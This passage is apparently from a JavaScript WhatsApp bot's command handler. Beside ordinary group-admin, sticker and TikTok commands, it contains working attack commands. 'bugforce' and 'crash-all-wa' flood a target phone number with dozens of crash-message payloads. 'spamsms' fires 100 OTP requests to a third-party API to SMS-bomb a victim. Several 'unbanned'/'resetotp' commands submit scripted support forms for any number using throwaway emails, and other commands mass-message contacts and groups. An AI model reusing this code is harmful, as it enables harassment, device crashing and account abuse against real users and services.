 vareltzyganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await VxoZap.sendMessage(from, { audio: vareltzyganteng, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6285655649546',
title: `VarelTzy`,
sourceUrl: `https://wa.me/6285655649546`, 
thumbnail: xfoto
}
}})
break

case 'pushkontak':{
if (!isCreator) return replyy(global.nocreator)
if (!m.isGroup) return replyy(global.noingroup)
if (!qtext) return replyy(global.notext)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
replyy(`*Send a message to ${mem.length} people, time is over ${mem.length * 3} second*`)
for (let geek of mem) {
await sleep(5000)
VxoZap.sendMessage(geek, {text: `${teksnye}`}, {quoted:m})
}
replyy(`*Successfully sent message To ${mem.length} person*`)
}
break

case 'bcgroup': {
if (!isDev) return replyy(global.nocreator)
if (!qtext) return replyy(global.notext)
await loading()
let getGroups = await VxoZap.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
replyy(`Send Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} second`)
for (let i of anu) {
await sleep(1500)
VxoZap.sendMessage(i, {text: `${qtext}`}, {quoted:m})
    }
replyy(`Successfully Sending Broadcast To ${anu.length} Group`)
}
break

case 'hidetag': {
if (!isDev) return replyy(global.nocreator)
if (!m.isGroup) return replyy(global.noingroup)
VxoZap.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break
case 'bugforce': case 'ceksatu': case 'fakyou': case 'reboot': { 
if (!isCreator) return replyy(`ANJ SIAPA LU`)
if (!q) return replyy(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return replyy(`𖤍 Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
let buttongg = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${pepec}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${pepec}`,
      merchant_url: `https://wa.me/${pepec}`
   })
}], m, {
   body: buttongg,
   footer: 'Powered By VarelTzy'
})
for (let j = 0; j < 1; j++) {
await VxoZap.sendMessage(Pe, {text: `MASIH IDUP KAN LU?`}, {quoted:m})
await bakdok(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await sendBugIos(Pe)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await VxoZap.sendMessage(Pe, { location : virgam,  caption: `${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, { location : virgam,  caption: `${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, { location : virgam,  caption: `${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, {text: `bang?`}, {quoted:m})
}
await replyy(`CEK AJA PASTI C1`)
}
break
case 'crash-all-wa': {
if (!isCreator) return replyy(`ANJ SIAPA LU`)
if (!q) return replyy(`Penggunaan .${command} 628xxx`)
let rapperr = q.replace(/[^0-9]/g, "")
if (rapperr.startsWith('0')) return replyy(`𖤍 Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = rapperr + '@s.whatsapp.net'
let buttonggg = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${rapperr}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${rapperr}`,
      merchant_url: `https://wa.me/${rapperr}`
   })
}], m, {
   body: buttonggg,
   footer: 'Powered By VarelTzy'
})
for (let j = 0; j < 1; j++) {
await VxoZap.sendMessage(Pe, {text: `MASIH IDUP KAN LU?`}, {quoted:m})
await bakdok(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await sendBugIos(Pe)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await VxoZap.sendMessage(Pe, { location : virgam,  caption: `${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, { location : virgam,  caption: `${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, { location : virgam,  caption: `${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, {text: `bang?`}, {quoted:m})
}
await replyy(`CEK AJA PASTI C1`)
}
break
case 'kick': {
if (!isDev) return replyy(global.nocreator)
if (!m.isGroup) return replyy(global.noingroup)
if (!isBotAdmins) return replyy(global.nobotadmin)
if (!isAdmins) return replyy(global.usernoadmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await VxoZap.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => replyy(util.format(res))).catch((err) => replyy(util.format(err)))
}
break

case 'add': {
if (!isDev) return replyy(global.nocreator)
if (!m.isGroup) return replyy(global.noingroup)
if (!isBotAdmins) return replyy(global.nobotadmin)
if (!isAdmins) return replyy(global.usernoadmin)
await loading()
let users = m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await VxoZap.groupParticipantsUpdate(from, [users], 'add')
}
break

case 'promote': {
if (!isDev) return replyy(global.nocreator)
if (!m.isGroup) return replyy(global.noingroup)
if (!isBotAdmins) return replyy(global.nobotadmin)
if (!isAdmins) return replyy(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await VxoZap.groupParticipantsUpdate(from, [users], 'promote')
}
break

case 'demote': {
if (!isDev) return replyy(global.nocreator)
if (!m.isGroup) return replyy(global.noingroup)
if (!isBotAdmins) return replyy(global.nobotadmin)
if (!isAdmins) return replyy(global.usernoadmin)
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await VxoZap.groupParticipantsUpdate(from, [users], 'demote')
}
break

case 'editsubjek': {
if (!isDev) return replyy(global.nocreator)
if (!m.isGroup) return replyy(global.noingroup)
if (!isBotAdmins) return replyy(global.nobotadmin)
if (!isAdmins) return replyy(global.usernoadmin)
if (!qtext) return replyy(global.notext)
await loading()
await VxoZap.groupUpdateSubject(from, qtext)
}
break

case 'editdesk':{
if (!isDev) return replyy(global.nocreator)
if (!m.isGroup) return replyy(global.noingroup)
if (!isBotAdmins) return replyy(global.nobotadmin)
if (!isAdmins) return replyy(global.usernoadmin)
if (!qtext) return replyy(global.notext)
await loading()
await VxoZap.groupUpdateDescription(from, qtext)
}
break

case 'linkgroup': case 'linkgc': {
if (!isDev) return replyy(global.nocreator)
if (!m.isGroup) return replyy(global.noingroup)
if (!isBotAdmins) return replyy(global.nobotadmin)
await loading()
let responsegg = await VxoZap.groupInviteCode(from)
VxoZap.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!isDev) return replyy(global.nocreator)
if (!m.isGroup) return replyy(global.noingroup)
if (!isBotAdmins) return replyy(global.nobotadmin)
await loading()
VxoZap.groupRevokeInvite(from)
break

case 'public': {
if (!isDev) return replyy(global.nocreator)
VxoZap.public = true
replyy('Sukse Change To Public')
}
break

case 'self': {
if (!isDev) return replyy(global.nocreator)
VxoZap.public = false
replyy('Sukse Change To Self')
}
break

case 'unbanned': {
if (!isCreator) return replyy(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Привет WhatsApp Мой номер WhatsApp был заблокирован без причины. Пожалуйста, повторно активируйте мой номер WhatsApp, так как этот номер содержит много моей личной информации, которую я храню на этом номере, а также использую этот номер для своей офисной работы, что очень важно. Пожалуйста, активируйте мой номер WhatsApp как можно скорее. Спасибо.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replyy(`Please wait for the unbanned process for 12 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else replyy(util.format(res.data))
} catch (err) {replyy(`${err}`)}
} else replyy('Insert Number')
}
break

case 'unbannedv2': {
if (!isCreator) return replyy(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Привет, поддержка WhatsApp. Несколько дней назад я открыл приложение WhatsApp, но получил уведомление о том, что моя учетная запись WhatsApp не авторизована, и попросил зарегистрировать новый номер телефона. Почему мой номер не может использовать WhatsApp? Я считаю, что я никогда не нарушал политику WhatsApp, никогда не причинял вреда другим пользователям WhatsApp и использую WhatsApp только для бизнеса своей компании. Пожалуйста, повторно активируйте мой номер WhatsApp, поскольку этот номер содержит важные данные для моего бизнеса и деятельности. Пожалуйста, обработайте мой запрос как можно быстрее.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replyy(`Please wait for the unbanned process for 12 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else replyy(util.format(res.data))
} catch (err) {replyy(`${err}`)}
} else replyy('Insert Number!')
}
break

case 'unbannedv3': {
if (!isCreator) return replyy(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Здравствуйте, доброе утро, WhatsApp. Я пользователь WhatsApp со следующим номером ${targetnya}. У меня возникла проблема с блокировкой моего номера WhatsApp. Когда я открыл приложение WhatsApp, я получил уведомление: «Эта учетная запись не может использовать приложение WhatsApp». Раньше я отправлял сообщения в чат своей семье только во время работы. и я не считаю, что совершил какое-либо нарушение условий обслуживания WhatsApp. Приношу извинения, я рассматриваю возможность повторной активации заблокированной учетной записи WhatsApp. Спасибо`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replyy(`Please wait for the unbanned process for 12 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else replyy(util.format(res.data))
} catch (err) {replyy(`${err}`)}
} else replyy('Insert number!')
}
break

case 'resetotp': {
if (!isCreator) return replyy(global.nocreator)
if (m.quoted || q) {
tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Olá, suporte pelo WhatsApp. Alguém tentou fazer login na minha conta do Whatsapp, então estou desconectado da minha conta do Whatsapp, mas infelizmente não consigo mais fazer login na minha conta do Whatsapp porque tenho que esperar 12 horas para receber o código de verificação. Por favor, redefina meu código de verificação do WhatsApp.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replyy(`i have reset the otp on that number and remember it only works if the otp is more than 3 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else replyy(util.format(res.data))
} catch (err) {replyy(`${err}`)}
} else replyy('Insert number!')
}
break

case 'spamsms': {
if (!isCreator) return replyy('*Premium only*')
await loading()
const froms = m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || qtext) {
if (froms.startsWith('08')) return replyy('Awali nomor dengan +62')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY vareltzy`);
});
}
} else replyy(`Use of spam SMS number/reply target message*\nExample of spam SMS +6281214281312`)
replyy(`SMS/call spam will be sent to the target number`)
}
break

case 'infobot':
infobot = {
image: xfoto,
caption: `𝙎𝘾 𝙄𝙉𝙄 𝘿𝙄 𝘽𝙐𝘼𝙏 𝙊𝙇𝙀𝙃 𝙑𝘼𝙍𝙀𝙇

𝙈𝙊𝙃𝙊𝙉 𝙅𝘼𝙉𝙂𝘼𝙉 𝘿𝙄 𝙎𝙀𝘽𝘼𝙍𝙆𝘼𝙉 𝙎𝙀𝘾𝘼𝙍𝘼 𝙁𝙍𝙀𝙀 
𝙆𝘼𝙍𝙀𝙉𝘼 𝘼𝙆𝘼𝙉 𝙈𝙀𝙉𝙔𝙀𝘽𝘼𝘽𝙆𝘼𝙉 𝘽𝙐𝙂 𝙉𝙔𝘼 𝘾𝙀𝙋𝘼𝙏 𝘿𝙄 𝙁𝙄𝙓𝙓
𝙈𝙊𝙃𝙊𝙉 𝙆𝙀𝙍𝙅𝘼𝙎𝘼𝙈𝘼 𝙉𝙔𝘼 𝘼𝙉𝘿𝘼 𝙔𝘼𝙉𝙂 𝙍𝙐𝙂𝙄 𝘽𝙐𝙆𝘼𝙉 𝙎𝘼𝙔𝘼
𝙊𝙏𝘼𝙆 𝙉𝙔𝘼 𝘿𝙄 𝙋𝘼𝙆𝙀𝙆

𝙋𝙀𝙉𝘼𝙈𝘽𝘼𝙃𝘼𝙉 𝙁𝙄𝙏𝙐𝙍
- 𝙄𝙉𝙏𝙀𝙍𝘼𝘾𝙏𝙄𝙑𝙀 𝘽𝙐𝙏𝙏𝙊𝙉
- 𝘽𝙐𝙂 𝙄𝙊𝙎
- 𝙎𝙌𝙇 𝙓 𝙋𝘼𝙔
- 𝙄𝙉𝙎𝙏𝘼𝙇𝙇 𝙋𝘼𝙉𝙀𝙇
- 𝘿𝙊𝙈𝘼𝙄𝙉 𝙈𝙀𝙉𝙐
- 𝙑𝙋𝙎 𝙈𝙀𝙉𝙐
- 𝘽𝙐𝙂𝙈𝙀𝙉𝙐𝙑1

𝙐𝙉𝙏𝙐𝙆 𝘽𝙐𝙂𝙈𝙀𝙉𝙐𝙑2 𝙈𝘼𝙎𝙄𝙃 𝘽𝙀𝙇𝙐𝙈 𝙒𝙊𝙍𝙆

𝙁𝙄𝙏𝙐𝙍 𝙀𝙍𝙊𝙍? 𝙇𝘼𝙋𝙊𝙍 𝘿𝙀𝙑
- wa.me/6285655649546 ( 𝙑𝙖𝙧𝙚𝙡𝙏𝙯𝙮 )


𝙏𝙌𝙏𝙊 
𝙋𝘼𝙆 𝙏𝙕𝙔 ( 𝙋𝙀𝙉𝙔𝙀𝘿𝙄𝘼 𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝘽𝙐𝙂 + 𝙄𝘿𝙀 )
𝙑𝘼𝙍𝙀𝙇 𝙏𝙕𝙔 ( 𝘿𝙀𝙑 )
𝙃𝙒 𝙈𝙊𝘿𝙎 ( 𝘽𝘼𝙎𝙀 𝘽𝙊𝙏 )

© 𝙑𝙖𝙧𝙚𝙡𝙏𝙯𝙮`
}
VxoZap.sendMessage(from, infobot)
break


case 'sticker':
 if (!quoted) return replyy(`Reply to Video/Image With Caption ${prefix + command}`)
if (/image/.test(mime)) {
await loading()
let media = await quoted.download()
let encmedia = await VxoZap.sendImageAsSticker(from, media, m, { packname: global.sticker1, author: global.sticker2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyy('Maximum 10 seconds!')
let media = await quoted.download()
let encmedia = await VxoZap.sendVideoAsSticker(from, media, m, { packname: global.sticker1, author: global.sticker2 })
await fs.unlinkSync(encmedia)
} else {
return replyy(`Send Images/Videos With Caption ${prefix + command}\nVideo Duration 1-9 Seconds`)
}
break

case 'attp':
if (args.length == 0) return replyy(global.notext)
await loading()
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
VxoZap.sendMessage(from, { sticker : ini_buffer }, { quoted:m })
break

case 'smeme':
if (!qtext) return replyy(global.notext)
if (!quoted) throw `Reply to Image With Caption ${prefix + command}`
if (/image/.test(mime)) {
await loading()
mee = await VxoZap.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${qtext}.png?background=${mem}`)
VxoZap.sendImageAsSticker(from, kaytid, m, { packname: global.sticker1, author: global.sticker2 })
}
break

case 'tiktokmp4':{
if (!qtext) return replyy( `Example : ${prefix + command} link`)
linkRegexx = args.join(" ")
codedd = linkRegexx.split("https://vt.tiktok.com/")[1]
if (!codedd) return replyy("Link Invalid")
await loading()
require('./lib/tiktok').Tiktok(q).then( data => {
VxoZap.sendMessage(from, { caption: `VarelTzy 👊!`, video: { url: data.watermark }}, {quoted:m})
})}
break

case 'inspect':{
if (!isCreator) return replyy(global.nocreator)
if (!qtext) return replyy('Link?')
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return replyy("Link Invalid")
VxoZap.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`
replyy(tekse)
})}
break

case 'tiktokmp3':{
if (!qtext) return replyy( `Example : ${prefix + command} link`)
linkRegexx = args.join(" ")
codedd = linkRegexx.split("https://vt.tiktok.com/")[1]
if (!codedd) return replyy("Link Invalid")
await loading()
require('./lib/tiktok').Tiktok(q).then( data => {
VxoZap.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
